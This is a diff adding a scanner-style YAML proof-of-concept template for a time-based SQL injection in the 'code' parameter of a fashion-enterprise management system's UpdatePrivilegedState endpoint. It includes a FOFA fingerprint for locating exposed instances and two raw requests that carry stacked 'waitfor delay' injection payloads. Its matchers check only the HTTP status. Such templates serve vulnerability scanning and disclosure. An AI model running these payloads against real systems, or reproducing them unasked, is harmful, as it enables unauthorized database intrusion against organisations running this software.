@@ -1,0 +1,34 @@
+id: poc-aqgygt12e3xm21ka
+info:
+  name: 时尚企业管理系统UpdatePrivilegedState code参数存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aqgygt12e3xm21ka'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: aqgygt12e3xm21ka
+    fofa: body="4008-820-967"
+http:
+- raw:
+  - 'GET /Interface/licx/PrivilegedCodeDestroy.asmx/UpdatePrivilegedState?code=%27+%3Bwaitfor+delay+%270%3A0%3A0%27+-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /Interface/licx/PrivilegedCodeDestroy.asmx/UpdatePrivilegedState?code=%27+%3Bwaitfor+delay+%270%3A0%3A3%27+-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
